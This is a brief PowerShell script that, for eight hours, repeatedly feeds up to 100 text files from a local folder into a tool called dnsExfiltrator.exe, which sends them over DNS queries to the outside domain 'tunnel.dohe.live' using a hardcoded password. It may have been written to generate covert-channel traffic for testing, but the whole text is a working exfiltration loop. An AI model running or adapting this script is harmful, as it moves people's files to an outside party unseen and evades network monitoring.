# Set configuration
$domain = "tunnel.dohe.live"
$password = "password"
$exfilTool = ".\dnsExfiltrator.exe"
$textFolder = ".\texts"

# Calculate end time (8 hours from now)
$endTime = (Get-Date).AddHours(8)

while ((Get-Date) -lt $endTime) {
    # Get the first 100 .txt files in the folder
    $files = Get-ChildItem -Path $textFolder -Filter *.txt | Select-Object -First 100

    foreach ($file in $files) {
        Write-Host "Exfiltrating file: $($file.FullName)"
        
        # Run dnsExfiltrator.exe with positional arguments
        & $exfilTool $file.FullName $domain $password

        # Optional: add a small delay if needed
        Start-Sleep -Milliseconds 500
    }

    Write-Host "Finished one round of exfiltrating $($files.Count) files."

    # Optional: delay between rounds (e.g., 5 seconds)
    Start-Sleep -Seconds 5
}

Write-Host "Finished running for 8 hours."
